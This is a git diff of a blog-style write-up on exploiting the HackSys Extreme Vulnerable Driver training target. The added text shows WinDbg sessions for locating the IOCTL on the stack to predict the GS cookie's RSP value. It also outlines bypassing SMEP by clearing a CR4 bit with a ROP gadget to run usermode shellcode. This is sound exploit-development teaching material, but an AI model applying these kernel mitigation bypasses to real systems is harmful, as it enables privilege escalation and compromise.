@@ -126,7 +126,24 @@ while (pProcessInfo != NULL) {
 }
 ```
 
-For step 2, I've put a breakpoint at the start of our vulnerable function and looked at the data on the stack. I've found that in our case, the value of the current IOCTL is in a consistent place on the stack relative to RSP. Therefore it can be used as an anchor for our calculations.
+Step 2 can be done through static code reversing or in a dynamic way.  
+For me, the dynamic way was easier. I've put a breakpoint at the start of our vulnerable function and looked at the data on the stack. I've found that in our case, the value of the current IOCTL is in a consistent place on the stack relative to RSP. Therefore it can be used as an anchor for our calculations.  
+From the images above we can see that ```xor rax, rsp``` (rax == cookie) happens at offset 0x866FB in the HEVD.sys driver. So in windbg we enter ```bp hevd+866FB``` and trigger the function:
+```
+2: kd> bp hevd+866FB
+2: kd> g
+Breakpoint 0 hit
+HEVD+0x866fb:
+fffff805`2d8b66fb 4833c4          xor     rax,rsp
+1: kd> r rsp
+rsp=ffff928d8b2d1540
+1: kd> s rsp L1000 07 20 22
+ffff928d`8b2d17e8  07 20 22 00 00 00 00 00-c0 db c6 36 0c e4 ff ff  . "........6....
+ffff928d`8b2d18d0  07 20 22 00 00 00 00 00-e5 8d c1 28 05 f8 ff ff  . "........(....
+ffff928d`8b2d1998  07 20 22 00 0c e4 ff ff-00 00 00 00 80 00 10 00  . ".............
+ffff928d`8b2d1ab8  07 20 22 00 cc cc cc cc-00 9e 11 0c 88 00 00 00  . ".............
+```
+The IOCTL is 0x222007 so we search it from current RSP and up, and we've found multiple results.
 
 Step 3 is pretty simple and looks like this:
 ```cpp
@@ -152,15 +169,25 @@ if (!foundControlCode) {
 }
 ```
 
-Step 4 can be done through static code reversing or in a dynamic way.  
-For me, the dynamic way was easier and invloved putting breakpoints at the arbitrary read function and at the buffer overflow function and see the difference in the RSP values.  
-The results were that the RSP that gets xored with the cookie is predicted to be ```CTL_CODE_ADDRESS - 0x2a8```.  
+Step 4 is just putting all the pieces together. Let's take the closest result to RSP from our search and calculate the distance:
+```
+1: kd> .formats ffff928d`8b2d17e8 - ffff928d8b2d1540
+Evaluate expression:
+  Hex:     00000000`000002a8
+  Decimal: 680
+```
+The results show that the RSP that gets xored with the cookie is predicted to be ```CTL_CODE_ADDRESS - 0x2a8```.  
+Now we have all that we need to bypass the GS stack protection and move on to getting our shellcode executed.
 
 
 
 ## Writing the shellcode
 
 ## Bypassing SMEP
+The best result for me was getting arbitrary shellcode executed. If we reach that step, we can do everything we want in that shellcode from the kernel's context.  
+As we have no way of allocating our shellcode in the kernel's memory with Execute permissions we have to either construct a rop that does just that or allocate our shellcode in usermode memory and construct a rop chain that executes it.  
+We'll choose the later as it's easier. But the major obstacle we need to get through is SMEP - a protection that bugchecks if the kernel tries to execute code that's found in usermode address.  
+SMEP status is determined by the 20th bit in the CR4 register. It's a privileged register so only the kernel can modify its contents. The classic and easiest way of bypassing it's by disabling it in the CR4 register using a rop gadget like ```mov cr4, rcx```.
 
 ## Putting it all together
 
